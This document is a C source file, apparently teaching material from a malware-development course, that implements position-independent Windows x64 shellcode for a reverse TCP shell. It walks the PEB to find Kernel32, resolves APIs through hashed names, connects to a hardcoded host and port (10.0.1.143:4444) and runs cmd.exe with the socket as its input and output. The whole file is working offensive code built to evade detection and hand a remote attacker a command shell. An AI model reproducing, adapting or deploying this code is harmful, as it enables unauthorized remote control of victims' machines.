/*! 
 *  Author:      C5pider 
 *  Date:        07.08.2023
 *  Description: simple shellcode reverse tcp shell
 *
 *  Maldev Academy 
 */

#include <winsock2.h>
#include "shellcode.h"

typedef int WSASTARTUP(
  WORD      wVersionRequired,
  LPWSADATA lpWSAData
); typedef WSASTARTUP* PWSASTARTUP;

typedef HMODULE LOADLIBRARYA (
  LPCSTR lpLibFileName
); typedef LOADLIBRARYA* PLOADLIBRARYA; 

typedef unsigned long INET_ADDR (
  const char *cp
); typedef INET_ADDR* PINET_ADDR;

typedef u_short HTONS(
  u_short hostshort
); typedef HTONS* PHTONS;

typedef SOCKET WSASOCKETA (
  int                 af,
  int                 type,
  int                 protocol,
  LPWSAPROTOCOL_INFOA lpProtocolInfo,
  GROUP               g,
  DWORD               dwFlags
); typedef WSASOCKETA* PWSASOCKETA; 

typedef int CONNECT(
  SOCKET             	    s,
  const struct sockaddr_in* name,
  int                	    namelen
); typedef CONNECT* PCONNECT; 

typedef BOOL CREATEPROCESSA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
); typedef CREATEPROCESSA* PCREATEPROCESSA;

/*!
 * NOTE:
 *    this code has been compiled using the 
 *    x64_86 Mingw cross compiler on linux. 
 *    So keep in mind that this might not compile 
 *    under Visual studio. 
 */

/*!
 * @brief
 *  a small stub that aligns the stack
 *  by 16-bytes as specified in the 
 *  official Microsoft documentation.
 *  this part is getting executed first when 
 *  the shellcode is getting invoked.
 */
asm(
  "Start:                         \n"
  " push rsi                      \n"
  " mov  rsi, rsp                 \n"
  " and  rsp, 0xFFFFFFFFFFFFFFF0  \n"
  " sub  rsp, 0x20                \n"
  " call Main                     \n"
  " mov  rsp, rsi                 \n"
  " pop  rsi                      \n"
  " ret                           \n"
);

/*!
* @brief
*   shellcode main function
*
*   shellcode tcp reverse shell 
*/
VOID Main() {
    CHAR            	Host[]          = { '1', '0', '.', '0', '.', '1', '.', '1', '4', '3', 0 }; // 10.0.1.143
    DWORD           	Port            = 4444; 
    WSADATA         	WsaData         = { 0 };
    SOCKET 		Socket 		= { 0 };
    struct sockaddr_in  SocketAddrIn    = { 0 };
    CHAR            	CmdStr[]        = { 'c', 'm', 'd', 0 };
    PVOID   	    	Kernel32        = { 0 };
    PVOID   	    	Ws2_32          = { 0 };     
    CHAR    	    	Ws2_Str[]       = { 'W', 's', '2', '_', '3', '2', 0 }; 
    STARTUPINFO     	StartupInfo     = { 0 }; 
    PROCESS_INFORMATION ProcessInfo 	= { 0 };

    PLOADLIBRARYA   	pLoadLibraryA   = NULL;
    PCREATEPROCESSA 	pCreateProcessA = NULL;
    PWSASTARTUP     	pWsaStartup     = NULL;
    PWSASOCKETA     	pWsaSocketA     = NULL;
    PHTONS 	    	pHtons          = NULL;
    PINET_ADDR 	    	pInetAddr       = NULL;
    PCONNECT 	    	pConnect        = NULL;
 
    /* Load Kernel32 from PEB */
    if ( ( Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {

	/* load requiered functions */
	pLoadLibraryA   = LdrFunctionAddr( Kernel32, H_API_LOADLIBRARYA   ); 
	pCreateProcessA = LdrFunctionAddr( Kernel32, H_API_CREATEPROCESSA ); 

	/* load w2_32.dll */
	if ( ( Ws2_32 = pLoadLibraryA( Ws2_Str ) ) ) {

	    /* load socket apis */	    
	    pWsaStartup = LdrFunctionAddr( Ws2_32, H_API_WSASTARTUP ); 
	    pWsaSocketA = LdrFunctionAddr( Ws2_32, H_API_WSASOCKETA );
	    pHtons      = LdrFunctionAddr( Ws2_32, H_API_HTONS      ); 
	    pInetAddr   = LdrFunctionAddr( Ws2_32, H_API_INET_ADDR  ); 
	    pConnect	= LdrFunctionAddr( Ws2_32, H_API_CONNECT    );     

	    /*
	     * here start our reverse shell logic code
	     */

	    /* init wsa */
	    if ( pWsaStartup( MAKEWORD( 2, 2 ), &WsaData ) != 0 ) {
		/* we failed. exit shellcode */
		return;
	    } 

	    /* create socket */
	    if ( ! ( Socket = pWsaSocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL ) ) ) {
		/* we failed. exit shellcode */
		return; 
	    } 

	    /* init socket addr struct (where to connect to) */
	    SocketAddrIn.sin_family      = AF_INET;
	    SocketAddrIn.sin_addr.s_addr = pInetAddr( Host );
	    SocketAddrIn.sin_port        = pHtons( Port );

	    if ( pConnect( Socket, (struct sockaddr*) &SocketAddrIn, sizeof( SocketAddrIn ) ) != 0 ) {
		/* we failed. exit shellcode */ 
		return;  
	    }

	    /* zero out the startupinfo struct */
	    MemZero( &StartupInfo, sizeof( StartupInfo ) );  
    
	    /* init startupinfo struct to tell the childprocesss to 
	     * read/write to our connection/socket */
	    StartupInfo.cb 	  = sizeof( StartupInfo );
	    StartupInfo.dwFlags   = STARTF_USESTDHANDLES;
	    StartupInfo.hStdInput = StartupInfo.hStdOutput = StartupInfo.hStdError = C_PTR( Socket );

	    /* create our cmd.exe process with our socket as I/O */
	    if ( pCreateProcessA( NULL, CmdStr, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo ) ) {
		while( TRUE );  
	    } 
	}
    } 
}

/*!
 * @brief
 *   string hashing function 
 * 
 * @param String
 *   string pointer
 * 
 * @param Length
 *   string length (optional for ascii but requiered for wide strings)
 * 
 * @return 
 *   hashed string 
 */
ULONG HashString(
    _In_ PVOID String,
    _In_ ULONG Length
) {
    ULONG  Hash = { 0 };
    PUCHAR Ptr  = { 0 };
    UCHAR  Char = { 0 };

    Hash = 5381;
    Ptr  = String;

    do {
        Char = *Ptr;

        if ( ! Length ) {
            if ( !*Ptr ) break;
        } else {
            if ( U_PTR( Ptr - U_PTR( String ) ) >= Length ) break;
            if ( !*Ptr ) ++Ptr;
        }

        /* turn current character to uppercase */
        if ( Char >= 'a' ) {
            Char -= 0x20;
        }

        /* append hash */
        Hash = ( ( Hash << 5 ) + Hash ) + Char;

        ++Ptr;
    } while ( TRUE );

    return Hash;
}

/*!
 * @brief
 *  load module from PEB
 * 
 * @param Hash
 *  hash of module to load
 * 
 * @return
 *  module pointer
 */ 
PVOID LdrModulePeb(
  _In_ ULONG Hash
) {
    PLDR_DATA_TABLE_ENTRY Data  = NULL;
    PLIST_ENTRY           Head  = NULL;
    PLIST_ENTRY           Entry = NULL;

    /* Get pointer to list */
    Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    /* iterate over list */
    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );

        /* Compare the DLL Name! */
        if ( HashString( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash ) {
            return Data->DllBase;
        }
    }

    return NULL;
}

/*!
 * @brief
 *  gets the function pointer
 *
 * @param Module
 *  module to resolve function from
 *
 * @param Hash
 *  function hash to resolve
 *
 * @return
 *  function address 
 */
PVOID LdrFunctionAddr(
    _In_ PVOID Module,
    _In_ ULONG Hash
) {
    PIMAGE_NT_HEADERS       NtHeader         = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
    SIZE_T                  ExpDirectorySize = { 0 };
    PDWORD                  AddrOfFunctions  = { 0 };
    PDWORD                  AddrOfNames      = { 0 };
    PWORD                   AddrOfOrdinals   = { 0 };
    PCHAR                   FunctionName     = { 0 };

    if ( ! Module || ! Hash ) {
      return NULL;
    }

    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );

    for ( int i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
      FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
      if ( HashString( FunctionName, 0 ) == Hash ) {
        return C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
      }
    }

    return NULL;
}
